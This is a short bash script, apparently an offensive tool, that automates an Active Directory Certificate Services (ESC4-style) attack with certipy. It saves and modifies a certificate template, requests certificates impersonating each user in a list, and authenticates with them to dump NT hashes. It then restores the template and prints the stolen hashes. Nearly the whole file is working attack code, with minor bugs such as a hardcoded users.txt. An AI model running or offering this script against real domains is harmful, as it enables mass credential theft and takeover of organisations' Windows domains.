#!/bin/bash
if [ $# -lt 1 ]; then
#man
	echo DumpNTDS_ADCS.sh username password template_name target_ca ca dc-ip users_file  
else
	username=$1; domain=$2; password=$3; template=$4; target_ca=$5; ca=$6; dc=$7; users_file=$8; output_dir='output_'$template
	mkdir $output_dir
	certipy template -u $username'@'$domain -p $password -template $template -save-old -debug 
	mv $template'.json' $output_dir
	for requested_user in `cat users.txt | cut -d '' -f 1`; do 
		certipy req -u $username'@'$domain -p $password  -target $target_ca -template $template -ca $ca -upn $requested_user'@'$domain -out $output_dir/$requested_user
		certipy auth -pfx 'output_'$template/$requested_user'.pfx' -dc-ip $dc | tee -a $output_dir/logs.txt
	done
	certipy template -u $username'@'$domain -p $password -template $template -configuration $output_dir/$template'.json'
	echo ""
	echo "⁼*=*⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*=⁼*="
	echo "THIS IS THE END"
	echo "Hold your breath and count to ten"
	echo "..."
	echo "Enough, this is your hashes: "
	grep "Got hash for" $output_dir/logs.txt 
fi
